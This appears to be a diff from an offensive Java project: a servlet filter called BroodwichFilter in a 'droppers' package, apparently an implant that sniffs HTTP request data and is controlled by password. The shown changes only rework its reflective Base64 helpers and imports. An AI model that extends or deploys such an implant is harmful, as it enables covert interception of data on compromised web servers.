@@ -8,13 +8,7 @@
 
 package party.itistimeto.broodwich.droppers;
 
-import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.Filter;
-import javax.servlet.FilterChain;
-import javax.servlet.FilterConfig;
-import javax.servlet.ServletException;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
+import javax.servlet.*;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.*;
@@ -37,40 +31,10 @@ public class BroodwichFilter implements Filter {
     static final String filterName = "broodwich";
     public static final String setPatternModule = "party.itistimeto.broodwich.modules.setpattern";
     public static final String flushMatchesModule = "party.itistimeto.broodwich.modules.flushmatches";
-    private static Object base64EncoderObject;
-    private static Object base64DecoderObject;
-    private static Method base64EncoderMethod;
-    private static Method base64DecoderMethod;
     private ConcurrentLinkedQueue<String> sniffedData;
     private ConcurrentHashMap<String, Class> modules;
     private Pattern sniffPattern;
     private String password;
-
-    static {
-        // https://www.rgagnon.com/javadetails/java-0598.html
-
-        // todo: investigate further
-
-        // java v >= 8
-        try {
-            // todo: test how necessary this is.
-            base64EncoderObject = Class.forName("java.util.Base64").getDeclaredMethod("getEncoder").invoke(null);
-            base64DecoderObject = Class.forName("java.util.Base64").getDeclaredMethod("getDecoder").invoke(null);
-            base64EncoderMethod = Class.forName("java.util.Base64$Encoder").getDeclaredMethod("encodeToString", byte[].class);
-            base64DecoderMethod = Class.forName("java.util.Base64$Decoder").getDeclaredMethod("decode", String.class);
-        } catch (Exception e) {
-            // java 6 <= v < 9
-            try {
-                // todo: considering "breaking free" of 9+ modules and using this class for all jdk versions
-                base64EncoderObject = null;
-                base64DecoderObject = null;
-                base64EncoderMethod = Class.forName("javax.xml.bind.DatatypeConverter").getDeclaredMethod("printBase64Binary", byte[].class);
-                base64DecoderMethod = Class.forName("javax.xml.bind.DatatypeConverter").getDeclaredMethod("parseBase64Binary", String.class);
-            } catch (Exception f) {
-                // ...
-            }
-        }
-    }
 
     public BroodwichFilter() {
         super();
@@ -91,24 +55,34 @@ public class BroodwichFilter implements Filter {
 
     public static String encodeBase64(byte[] bytes) {
         try {
-            return (String) base64EncoderMethod.invoke(base64EncoderObject != null ? base64EncoderObject : null, bytes);
-        } catch (IllegalAccessException e) {
-            // todo: ugh
-            return "";
-        } catch (InvocationTargetException e) {
-            return "";
+            return (String) Class.forName("javax.xml.bind.DatatypeConverter").getDeclaredMethod("printBase64Binary", byte[].class).invoke(null, (Object) bytes);
+        } catch (Exception e) {
+            // ...
         }
+
+        try {
+            return (String) Class.forName("java.util.Base64$Encoder").getDeclaredMethod("encodeToString", byte[].class).invoke(Class.forName("java.util.Base64").getDeclaredMethod("getEncoder").invoke(null), (Object) bytes);
+        } catch (Exception e) {
+            // ...
+        }
+
+        return "";
     }
 
     public static byte[] decodeBase64(String encodedBytes) {
         try {
-            return (byte[]) base64DecoderMethod.invoke(base64DecoderObject != null ? base64DecoderObject : null, encodedBytes);
-        } catch (IllegalAccessException e) {
-            // todo: ugh
-            return new byte[0];
-        } catch (InvocationTargetException e) {
-            return new byte[0];
+            return (byte[]) Class.forName("javax.xml.bind.DatatypeConverter").getDeclaredMethod("parseBase64Binary", String.class).invoke(null, encodedBytes);
+        } catch (Exception e) {
+            // ...
         }
+
+        try {
+            return (byte[]) Class.forName("java.util.Base64$Decoder").getDeclaredMethod("decode", String.class).invoke(Class.forName("java.util.Base64").getDeclaredMethod("getDecoder").invoke(null), encodedBytes);
+        } catch (Exception e) {
+            // ...
+        }
+
+        return new byte[0];
     }
 
     @Override
